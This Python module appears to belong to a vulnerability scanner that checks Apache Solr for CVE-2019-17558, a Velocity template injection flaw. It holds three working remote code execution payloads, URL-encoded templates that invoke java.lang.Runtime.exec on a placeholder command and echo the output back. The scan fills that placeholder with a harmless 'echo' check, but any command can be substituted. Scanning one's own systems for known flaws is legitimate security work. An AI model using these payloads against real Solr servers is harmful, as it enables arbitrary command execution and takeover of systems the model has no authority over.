#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2019_17558_payloads = [
    {
        'path': "solr/{DBNAME}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{RCECOMMAND}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end",
    },
    {
        'path': "{DBNAME}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{RCECOMMAND}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end",
    },
    {
        'path': "select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{RCECOMMAND}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end",
    },
]

def cve_2019_17558_scan(self, clients):
    ''' 5.0.0版本至8.3.1版本中存在输入验证错误漏洞, 
        攻击者可借助自定义的Velocity模板功能, 利用Velocity-SSTI漏洞在Solr系统上执行任意代码
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2019-17558',
    }

    self.enable(client)                             # * 此漏洞需要启用Solr的RemoteStreaming功能
    if not self.params:
        return None

    for payload in cve_2019_17558_payloads:
        random_str = random_md5(6)
        RCEcommand = 'echo ' + random_str

        path = payload['path'].format(DBNAME=self.db_name, RCECOMMAND=RCEcommand)

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, random_str)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
